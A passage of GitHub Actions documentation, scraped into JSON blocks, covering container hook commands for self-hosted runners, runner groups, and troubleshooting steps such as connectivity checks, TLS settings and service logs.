        "text": "Example output forprepare_job"
      },
      {
        "type": "paragraph",
        "text": "This example output is the contents of theresponseFiledefined in the input above."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"serviceContainers\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"context\": {\n    \"container\": {\n      \"id\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n      \"network\": \"example_network_53269bd575972817b43f7733536b200c\"\n    },\n    \"services\": {\n      \"redis\": {\n        \"id\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\",\n        \"ports\": {\n          \"8080\": \"8080\"\n        },\n        \"network\": \"example_network_53269bd575972817b43f7733536b200c\"\n      }\n    },\n    \"isAlpine\": true\n  }\n}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "cleanup_job"
      },
      {
        "type": "paragraph",
        "text": "Thecleanup_jobcommand is called at the end of a job. GitHub Actions assumes that you will do the following tasks in thecleanup_jobcommand:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Stop any running service or job containers (or the equivalent pod).",
          "Stop the network (if one exists).",
          "Delete any job or service containers (or the equivalent pod).",
          "Delete the network (if one exists).",
          "Cleanup anything else that was created for the job."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Arguments forcleanup_job"
      },
      {
        "type": "paragraph",
        "text": "No arguments are provided forcleanup_job."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example input forcleanup_job"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"command\": \"cleanup_job\",\n  \"responseFile\": null,\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"serviceContainers\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"args\": {}\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example output forcleanup_job"
      },
      {
        "type": "paragraph",
        "text": "No output is expected forcleanup_job."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "run_container_step"
      },
      {
        "type": "paragraph",
        "text": "Therun_container_stepcommand is called once for each container action in your job. GitHub Actions assumes that you will do the following tasks in therun_container_stepcommand:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Pull or build the required container (or fail if you cannot).",
          "Run the container action and return the exit code of the container.",
          "Stream any step logs output to stdout and stderr.",
          "Cleanup the container after it executes."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Arguments forrun_container_step"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "image:Optional. A string containing the docker image. Otherwise a dockerfile must be provided.",
          "dockerfile:Optional. A string containing the path to the dockerfile, otherwise an image must be provided.",
          "entryPointArgs:Optional. A list containing the entry point args.",
          "entryPoint:Optional. The container entry point to use if the default image entrypoint should be overwritten.",
          "workingDirectory:Required. A string containing the absolute path of the working directory.",
          "createOptions:Optional. The optionalcreateoptions specified in the YAML. For more information, seeRunning jobs in a container.",
          "environmentVariables:Optional. Sets a map of key environment variables.",
          "prependPath:Optional. An array of additional paths to prepend to the$PATHvariable.",
          "userMountVolumes:Optional. an array of user mount volumes set in the YAML. For more information, seeRunning jobs in a container.sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.readOnly:Required. Determines whether or not the mount should be read-only.",
          "sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.",
          "targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.",
          "readOnly:Required. Determines whether or not the mount should be read-only.",
          "systemMountVolumes:Required. An array of mounts to mount into the container, using the same fields as above.sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.readOnly:Required. Determines whether or not the mount should be read-only.",
          "sourceVolumePath:Required. The source path to the volume that will be mounted into the Docker container.",
          "targetVolumePath:Required. The target path to the volume that will be mounted into the Docker container.",
          "readOnly:Required. Determines whether or not the mount should be read-only.",
          "registryOptional. The Docker registry credentials for a private container registry.username:Optional. The username of the registry account.password:Optional. The password to the registry account.serverUrl:Optional. The registry URL.",
          "username:Optional. The username of the registry account.",
          "password:Optional. The password to the registry account.",
          "serverUrl:Optional. The registry URL.",
          "portMappings:Optional. A key value hash of thesource:targetports to map into the container."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example input for image"
      },
      {
        "type": "paragraph",
        "text": "If you're using a Docker image, you can specify the image name in the\"image\":parameter."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"command\": \"run_container_step\",\n  \"responseFile\": null,\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"serviceContainers\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"args\": {\n    \"image\": \"node:18\",\n    \"dockerfile\": null,\n    \"entryPointArgs\": [\"-f\", \"/dev/null\"],\n    \"entryPoint\": \"tail\",\n    \"workingDirectory\": \"/__w/octocat-test2/octocat-test2\",\n    \"createOptions\": \"--cpus 1\",\n    \"environmentVariables\": {\n      \"NODE_ENV\": \"development\"\n    },\n    \"prependPath\": [\"/foo/bar\", \"bar/foo\"],\n    \"userMountVolumes\": [\n      {\n        \"sourceVolumePath\": \"my_docker_volume\",\n        \"targetVolumePath\": \"/volume_mount\",\n        \"readOnly\": false\n      }\n    ],\n    \"systemMountVolumes\": [\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work\",\n        \"targetVolumePath\": \"/__w\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/externals\",\n        \"targetVolumePath\": \"/__e\",\n        \"readOnly\": true\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp\",\n        \"targetVolumePath\": \"/__w/_temp\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_actions\",\n        \"targetVolumePath\": \"/__w/_actions\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_tool\",\n        \"targetVolumePath\": \"/__w/_tool\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_home\",\n        \"targetVolumePath\": \"/github/home\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_workflow\",\n        \"targetVolumePath\": \"/github/workflow\",\n        \"readOnly\": false\n      }\n    ],\n    \"registry\": null,\n    \"portMappings\": { \"80\": \"801\" }\n  }\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example input for Dockerfile"
      },
      {
        "type": "paragraph",
        "text": "If your container is defined by a Dockerfile, this example demonstrates how to specify the path to aDockerfilein your input, using the\"dockerfile\":parameter."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"command\": \"run_container_step\",\n  \"responseFile\": null,\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"services\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"args\": {\n    \"image\": null,\n    \"dockerfile\": \"/__w/_actions/foo/dockerfile\",\n    \"entryPointArgs\": [\"hello world\"],\n    \"entryPoint\": \"echo\",\n    \"workingDirectory\": \"/__w/octocat-test2/octocat-test2\",\n    \"createOptions\": \"--cpus 1\",\n    \"environmentVariables\": {\n      \"NODE_ENV\": \"development\"\n    },\n    \"prependPath\": [\"/foo/bar\", \"bar/foo\"],\n    \"userMountVolumes\": [\n      {\n        \"sourceVolumePath\": \"my_docker_volume\",\n        \"targetVolumePath\": \"/volume_mount\",\n        \"readOnly\": false\n      }\n    ],\n    \"systemMountVolumes\": [\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work\",\n        \"targetVolumePath\": \"/__w\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/externals\",\n        \"targetVolumePath\": \"/__e\",\n        \"readOnly\": true\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp\",\n        \"targetVolumePath\": \"/__w/_temp\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_actions\",\n        \"targetVolumePath\": \"/__w/_actions\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_tool\",\n        \"targetVolumePath\": \"/__w/_tool\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_home\",\n        \"targetVolumePath\": \"/github/home\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_workflow\",\n        \"targetVolumePath\": \"/github/workflow\",\n        \"readOnly\": false\n      }\n    ],\n    \"registry\": null,\n    \"portMappings\": { \"80\": \"801\" }\n  }\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example output forrun_container_step"
      },
      {
        "type": "paragraph",
        "text": "No output is expected forrun_container_step."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "run_script_step"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions assumes that you will do the following tasks:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Invoke the provided script inside the job container and return the exit code.",
          "Stream any step log output to stdout and stderr."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Arguments forrun_script_step"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "entryPointArgs:Optional. A list containing the entry point arguments.",
          "entryPoint:Optional. The container entry point to use if the default image entrypoint should be overwritten.",
          "prependPath:Optional. An array of additional paths to prepend to the$PATHvariable.",
          "workingDirectory:Required. A string containing the absolute path of the working directory.",
          "environmentVariables:Optional. Sets a map of key environment variables."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example input forrun_script_step"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"command\": \"run_script_step\",\n  \"responseFile\": null,\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"serviceContainers\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"args\": {\n    \"entryPointArgs\": [\"-e\", \"/runner/temp/example.sh\"],\n    \"entryPoint\": \"bash\",\n    \"environmentVariables\": {\n      \"NODE_ENV\": \"development\"\n    },\n    \"prependPath\": [\"/foo/bar\", \"bar/foo\"],\n    \"workingDirectory\": \"/__w/octocat-test2/octocat-test2\"\n  }\n}"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example output forrun_script_step"
      },
      {
        "type": "paragraph",
        "text": "No output is expected forrun_script_step."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Generating the customization script"
      },
      {
        "type": "paragraph",
        "text": "GitHub has created an example repository that demonstrates how to generate customization scripts for Docker and Kubernetes."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The resulting scripts are available for testing purposes, and you will need to determine whether they are appropriate for your requirements."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Clone theactions/runner-container-hooksrepository to your self-hosted runner.",
          "Theexamples/directory contains some existing customization commands, each with its own JSON file. You can review these examples and use them as a starting point for your own customization commands.prepare_job.jsonrun_script_step.jsonrun_container_step.json",
          "prepare_job.json",
          "run_script_step.json",
          "run_container_step.json",
          "Build the npm packages. These commands generate theindex.jsfiles insidepackages/docker/distandpackages/k8s/dist.npm install && npm run bootstrap && npm run build-all"
        ]
      },
      {
        "type": "paragraph",
        "text": "When the resultingindex.jsis triggered by GitHub Actions, it will run the customization commands defined in the JSON files. To trigger theindex.js, you will need to add it yourACTIONS_RUNNER_REQUIRE_JOB_CONTAINERenvironment variable, as described in the next section."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Triggering the customization script"
      },
      {
        "type": "paragraph",
        "text": "The custom script must be located on the runner, but should not be stored in the self-hosted runner application directory (that is, the directory into which you downloaded and unpacked the runner software). The scripts are executed in the security context of the service account that's running the runner service."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The triggered script is processed synchronously, so it will block job execution while running."
      },
      {
        "type": "paragraph",
        "text": "The script is automatically executed when the runner has the following environment variable containing an absolute path to the script:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "ACTIONS_RUNNER_CONTAINER_HOOKS: The script defined in this environment variable is triggered when a job has been assigned to a runner, but before the job starts running."
        ]
      },
      {
        "type": "paragraph",
        "text": "To set this environment variable, you can either add it to the operating system, or add it to a file named.envwithin the self-hosted runner application directory. For example, the following.enventry will have the runner automatically run the script at/Users/octocat/runner/index.jsbefore each container-based job runs:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "ACTIONS_RUNNER_CONTAINER_HOOKS=/Users/octocat/runner/index.js"
      },
      {
        "type": "paragraph",
        "text": "If you want to ensure that your job always runs inside a container, and subsequently always applies your container customizations, you can set theACTIONS_RUNNER_REQUIRE_JOB_CONTAINERvariable on the self hosted runner totrue. This will fail jobs that do not specify a job container."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "No timeout setting"
      },
      {
        "type": "paragraph",
        "text": "There is currently no timeout setting available for the script executed byACTIONS_RUNNER_CONTAINER_HOOKS. As a result, you could consider adding timeout handling to your script."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Reviewing the workflow run log"
      },
      {
        "type": "paragraph",
        "text": "To confirm whether your scripts are executing, you can review the logs for that job. For more information on checking the logs, seeUsing workflow run logs."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/managing-access-to-self-hosted-runners-using-groups",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About runner groups"
      },
      {
        "type": "paragraph",
        "text": "To control access to runners at the organization level, organizations using the GitHub Team plan can use runner groups. Runner groups are used to collect sets of runners and create a security boundary around them."
      },
      {
        "type": "paragraph",
        "text": "When you grant access to a runner group, you can see the runner group listed in the organization's runner settings. Optionally, you can assign additional granular repository access policies to the runner group."
      },
      {
        "type": "paragraph",
        "text": "When new runners are created, they are automatically assigned to the default group unless otherwise specified. Runners can only be in one group at a time. You can move runners from one runner group to another. For more information, seeMoving a runner to a group."
      },
      {
        "type": "paragraph",
        "text": "For information on how to route jobs to runners in a specific group, seeChoosing the runner for a job."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a self-hosted runner group for an organization"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you only use self-hosted runners with private repositories. This is because forks of your public repository can potentially run dangerous code on your self-hosted runner machine by creating a pull request that executes the code in a workflow."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When creating a runner group, you must choose a policy that defines which repositories have access to the runner group. To change which repositories and workflows can access the runner group, organization owners can set a policy for the organization. For more information, seeEnforcing policies for GitHub Actions in your enterprise."
      },
      {
        "type": "paragraph",
        "text": "All organizations have a single default runner group. Organization owners using the GitHub Team plan can create additional organization-level runner groups."
      },
      {
        "type": "paragraph",
        "text": "If no group is specified during the registration process, runners are automatically added to the default group. You can later move the runner from the default group to a custom group. For more information, seeMoving a runner to a group."
      },
      {
        "type": "paragraph",
        "text": "For information about how to create a runner group with the REST API, seeREST API endpoints for GitHub Actions."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "In the \"Runner groups\" section, clickNew runner group.",
          "Enter a name for your runner group.",
          "Assign a policy for repository access.You can configure a runner group to be accessible to a specific list of repositories, or to all repositories in the organization. By default, only private repositories can access runners in a runner group, but you can override this. This setting can't be overridden if configuring an organization's runner group that was shared by an enterprise.",
          "ClickCreate groupto create the group and apply the policy."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Changing which repositories can access a runner group"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you only use self-hosted runners with private repositories. This is because forks of your public repository can potentially run dangerous code on your self-hosted runner machine by creating a pull request that executes the code in a workflow."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For runner groups in an organization, you can change what repositories in the organization can access a runner group."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your runner groups are located.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "In the list of groups, click the runner group you'd like to configure.",
          "Under \"Repository access,\" use the dropdown menu to clickSelected repositories.To the right of the dropdown menu, click.In the popup, use the checkboxes to select repositories that can access this runner group.",
          "To the right of the dropdown menu, click.",
          "In the popup, use the checkboxes to select repositories that can access this runner group.",
          "ClickSave group."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Changing the name of a runner group"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your runner groups are located.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "In the list of groups, click the runner group you'd like to configure.",
          "Enter the new runner group name in the text field under \"Group name.\"",
          "ClickSave."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Automatically adding a self-hosted runner to a group"
      },
      {
        "type": "paragraph",
        "text": "You can use the configuration script to automatically add a new runner to a group. For example, this command registers a new runner and uses the--runnergroupparameter to add it to a group namedrg-runnergroup."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./config.sh --url $org_or_enterprise_url --token $token --runnergroup rg-runnergroup"
      },
      {
        "type": "paragraph",
        "text": "The command will fail if the runner group doesn't exist:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Could not find any self-hosted runner group named \"rg-runnergroup\"."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Moving a self-hosted runner to a group"
      },
      {
        "type": "paragraph",
        "text": "If you don't specify a runner group during the registration process, your new runners are automatically assigned to the default group, and can then be moved to another group."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the \"Runners\" list, click the runner that you want to configure.",
          "Select theRunner groupdrop-down.",
          "In \"Move runner to group\", choose a destination group for the runner."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Removing a self-hosted runner group"
      },
      {
        "type": "paragraph",
        "text": "In order to remove a runner group, you must first move or remove all of the runners from the group."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your runner groups are located.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "In the list of groups, to the right of the group you want to delete, click.",
          "To remove the group, clickRemove group.",
          "Review the confirmation prompts, and clickRemove this runner group."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Using repository-level self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "You may not be able to create a self-hosted runner for an organization-owned repository."
      },
      {
        "type": "paragraph",
        "text": "Organization owners can choose which repositories are allowed to create repository-level self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeDisabling or limiting GitHub Actions for your organization."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Checking the status of a self-hosted runner"
      },
      {
        "type": "paragraph",
        "text": "A self-hosted runner can be located in either your repository, organization, or enterprise account settings on GitHub. To manage a self-hosted runner, you must have the following permissions, depending on where the self-hosted runner was added:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "User repository:You must be the repository owner.",
          "Organization:You must be an organization owner.",
          "Organization repository:You must be an organization owner, or have admin access to the repository."
        ]
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In your organization or repository, navigate to the main page and clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "Under \"Runners\", you can view a list of registered runners, including the runner's name, labels, and status.The status can be one of the following:Idle:The runner is connected to GitHub and is ready to execute jobs.Active:The runner is currently executing a job.Offline:The runner is not connected to GitHub. This could be because the machine is offline, the self-hosted runner application is not running on the machine, or the self-hosted runner application cannot communicate with GitHub.",
          "Idle:The runner is connected to GitHub and is ready to execute jobs.",
          "Active:The runner is currently executing a job.",
          "Offline:The runner is not connected to GitHub. This could be because the machine is offline, the self-hosted runner application is not running on the machine, or the self-hosted runner application cannot communicate with GitHub."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting network connectivity"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Checking self-hosted runner network connectivity"
      },
      {
        "type": "paragraph",
        "text": "You can use the self-hosted runner application'sconfigscript with the--checkparameter to check that a self-hosted runner can access all required network services on GitHub."
      },
      {
        "type": "paragraph",
        "text": "In addition to--check, you must provide two arguments to the script:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "--urlwith the URL to your GitHub repository, organization, or enterprise. For example,--url https://github.com/octo-org/octo-repo.",
          "--patwith the value of a personal access token (classic), which must have theworkflowscope, or a fine-grained personal access token with workflows read and write access. For example,--pat ghp_abcd1234. For more information, seeManaging your personal access tokens."
        ]
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./config.sh --check --url URL --pat ghp_abcd1234"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./config.sh --check --url URL --pat ghp_abcd1234"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "config.cmd --check --url https://github.com/YOUR-ORG/YOUR-REPO --pat GHP_ABCD1234"
      },
      {
        "type": "paragraph",
        "text": "The script tests each service, and outputs either aPASSorFAILfor each one. If you have any failing checks, you can see more details on the problem in the log file for the check. The log files are located in the_diagdirectory where you installed the runner application, and the path of the log file for each check is shown in the console output of the script."
      },
      {
        "type": "paragraph",
        "text": "If you have any failing checks, you should also verify that your self-hosted runner machine meets all the communication requirements. For more information, seeCommunicating with self-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Disabling TLS certificate verification"
      },
      {
        "type": "paragraph",
        "text": "By default, the self-hosted runner application verifies the TLS certificate for GitHub. If you encounter network problems, you may wish to disable TLS certificate verification for testing purposes."
      },
      {
        "type": "paragraph",
        "text": "To disable TLS certification verification in the self-hosted runner application, set theGITHUB_ACTIONS_RUNNER_TLS_NO_VERIFYenvironment variable to1before configuring and running the self-hosted runner application."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "export GITHUB_ACTIONS_RUNNER_TLS_NO_VERIFY=1\n./config.sh --url https://github.com/YOUR-ORG/YOUR-REPO --token\n./run.sh"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "export GITHUB_ACTIONS_RUNNER_TLS_NO_VERIFY=1\n./config.sh --url https://github.com/YOUR-ORG/YOUR-REPO --token\n./run.sh"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "[Environment]::SetEnvironmentVariable('GITHUB_ACTIONS_RUNNER_TLS_NO_VERIFY', '1')\n./config.cmd --url https://github.com/YOUR-ORG/YOUR-REPO --token\n./run.cmd"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Disabling TLS verification is not recommended since TLS provides privacy and data integrity between the self-hosted runner application and GitHub. We recommend that you install the GitHub certificate in the operating system certificate store for your self-hosted runner. For guidance on how to install the GitHub certificate, check with your operating system vendor."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reviewing the self-hosted runner application log files"
      },
      {
        "type": "paragraph",
        "text": "You can monitor the status of the self-hosted runner application and its activities. Log files are kept in the_diagdirectory where you installed the runner application, and a new log is generated each time the application is started. The filename begins withRunner_, and is followed by a UTC timestamp of when the application was started."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Runner application log files for ephemeral runners must be forwarded and preserved externally for troubleshooting and diagnostic purposes. For more information about ephemeral runners and autoscaling self-hosted runners, seeAutoscaling with self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "For detailed logs on workflow job executions, see the next section describing theWorker_files."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reviewing a job's log file"
      },
      {
        "type": "paragraph",
        "text": "The self-hosted runner application creates a detailed log file for each job that it processes. These files are stored in the_diagdirectory where you installed the runner application, and the filename begins withWorker_."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using journalctl to check the self-hosted runner application service"
      },
      {
        "type": "paragraph",
        "text": "For Linux-based self-hosted runners running the application using a service, you can usejournalctlto monitor their real-time activity. The default systemd-based service uses the following naming convention:actions.runner.<org>-<repo>.<runnerName>.service. This name is truncated if it exceeds 80 characters, so the preferred way of finding the service's name is by checking the.servicefile. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ cat ~/actions-runner/.service\nactions.runner.octo-org-octo-repo.runner01.service"
      },
      {
        "type": "paragraph",
        "text": "If this fails due to the service being installed elsewhere, you can find the service name in the list of running services. For example, on most Linux systems you can use thesystemctlcommand:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ systemctl --type=service | grep actions.runner\nactions.runner.octo-org-octo-repo.hostname.service loaded active running GitHub Actions Runner (octo-org-octo-repo.hostname)"
      },
      {
        "type": "paragraph",
        "text": "You can usejournalctlto monitor the real-time activity of the self-hosted runner:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "sudo journalctl -u actions.runner.octo-org-octo-repo.runner01.service -f"
      },
      {
        "type": "paragraph",
        "text": "In this example output, you can seerunner01start, receive a job namedtestAction, and then display the resulting status:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Feb 11 14:57:07 runner01 runsvc.sh[962]: Starting Runner listener with startup type: service\nFeb 11 14:57:07 runner01 runsvc.sh[962]: Started listener process\nFeb 11 14:57:07 runner01 runsvc.sh[962]: Started running service\nFeb 11 14:57:16 runner01 runsvc.sh[962]: √ Connected to GitHub\nFeb 11 14:57:17 runner01 runsvc.sh[962]: 2020-02-11 14:57:17Z: Listening for Jobs\nFeb 11 16:06:54 runner01 runsvc.sh[962]: 2020-02-11 16:06:54Z: Running job: testAction\nFeb 11 16:07:10 runner01 runsvc.sh[962]: 2020-02-11 16:07:10Z: Job testAction completed with result: Succeeded"
      },
      {
        "type": "paragraph",
        "text": "To view thesystemdconfiguration, you can locate the service file here:/etc/systemd/system/actions.runner.<org>-<repo>.<runnerName>.service.\nIf you want to customize the self-hosted runner application service, do not directly modify this file. Follow the instructions described inConfiguring the self-hosted runner application as a service."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Usinglaunchdto check the self-hosted runner application service"
      },
      {
        "type": "paragraph",
        "text": "For macOS-based self-hosted runners running the application as a service, you can uselaunchctlto monitor their real-time activity. The default launchd-based service uses the following naming convention:actions.runner.<org>-<repo>.<runnerName>. This name is truncated if it exceeds 80 characters, so the preferred way of finding the service's name is by checking the.servicefile in the runner directory:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "% cat ~/actions-runner/.service\n/Users/exampleUsername/Library/LaunchAgents/actions.runner.octo-org-octo-repo.runner01.plist"
      },
      {
        "type": "paragraph",
        "text": "Thesvc.shscript useslaunchctlto check whether the application is running. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ ./svc.sh status\nstatus actions.runner.example.runner01:\n/Users/exampleUsername/Library/LaunchAgents/actions.runner.example.runner01.plist\nStarted:\n379 0 actions.runner.example.runner01"
      },
      {
        "type": "paragraph",
        "text": "The resulting output includes the process ID and the name of the application’slaunchdservice."
      },
      {
        "type": "paragraph",
        "text": "To view thelaunchdconfiguration, you can locate the service file here:/Users/exampleUsername/Library/LaunchAgents/actions.runner.<repoName>.<runnerName>.service.\nIf you want to customize the self-hosted runner application service, do not directly modify this file. Follow the instructions described inConfiguring the self-hosted runner application as a service."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using PowerShell to check the self-hosted runner application service"
      },
      {
        "type": "paragraph",
